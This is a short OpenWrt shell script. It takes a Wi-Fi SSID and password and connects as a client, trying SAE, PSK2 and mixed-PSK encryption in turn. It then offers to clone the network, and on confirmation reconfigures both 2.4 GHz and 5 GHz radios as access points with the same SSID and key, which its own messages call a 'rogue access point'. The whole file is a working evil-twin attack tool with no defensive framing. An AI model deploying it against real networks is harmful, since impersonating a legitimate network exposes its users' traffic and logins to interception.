#!/bin/sh

# Variables
INTERFACE="phy1-sta0"
SSID="$1"
PASSWORD="$2"

# Verify the arguments
if [ -z "$SSID" ] || [ -z "$PASSWORD" ]; then
    echo "Usage: $0 <SSID> <Password>"
    exit 1
fi

# Function to test an encryption type
test_encryption() {
    encryption_mode=$1

    echo "Test of encryption: $encryption_mode..."
    uci set wireless.@wifi-iface[1].mode='sta'
    uci set wireless.@wifi-iface[1].network='wwan'
    uci set wireless.@wifi-iface[1].ssid="$SSID"
    uci set wireless.@wifi-iface[1].key="$PASSWORD"
    uci set wireless.@wifi-iface[1].encryption="$encryption_mode"
    uci commit wireless

    wifi down
    sleep 3
    wifi up
    sleep 5

    # Check if the SSID appears in iw dev
    if iw dev "$INTERFACE" link | grep -q "$SSID"; then
        echo "Successful connection with encryption: $encryption_mode"
        return 0
    else
        echo "Failed connection with encryption: $encryption_mode"
        return 1
    fi
}

# List of encryption modes to test
encryption_detected=false
for encryption in sae psk2 psk-mixed; do
    if test_encryption "$encryption"; then
        echo "Type of encryption detected: $encryption"
        encryption_detected=true
        break
    fi
done

if [ "$encryption_detected" = false ]; then
    echo "Unable to detect the encryption type for $SSID."
    echo "Warning the SSID or the password may be incorrect!"
    exit 1
fi

# Ask the user if they want to clone the network
echo "Do you want to clone the Wifi network indicated above? (Y/N)"
read -r response

if [ "$response" = "Y" ] || [ "$response" = "y" ]; then
    echo "Please cut the current Wifi network to perform the rogue access point."

    # Ask the user to confirm before proceeding
    echo "Have you cut the current Wifi network? (Y/N)"
    read -r confirmation
    if [ "$confirmation" = "Y" ] || [ "$confirmation" = "y" ]; then
        # 2,4 GHz
        uci set wireless.@wifi-iface[1].mode='ap'
	      uci set wireless.@wifi-iface[1].network='lan'
        uci set wireless.@wifi-iface[1].ssid="$SSID"
        uci set wireless.@wifi-iface[1].key="$PASSWORD"
        uci set wireless.@wifi-iface[1].encryption="psk2"
        uci commit wireless
        # 5 GHz
        uci set wireless.@wifi-iface[0].mode='ap'
	      uci set wireless.@wifi-iface[0].network='lan'
        uci set wireless.@wifi-iface[0].ssid="$SSID"
        uci set wireless.@wifi-iface[0].key="$PASSWORD"
        uci set wireless.@wifi-iface[0].encryption="psk2"
        uci commit wireless
        wifi up

        echo "The rogue access point has been launched with the SSID: $SSID."
    else
        echo "Cancellation of the operation. The script is stopped."
        exit 0
    fi
elif [ "$response" = "N" ] || [ "$response" = "n" ]; then
    echo "The script is stopped."
    exit 0
else
    echo "Invalid response. The script is stopped."
    exit 1
fi

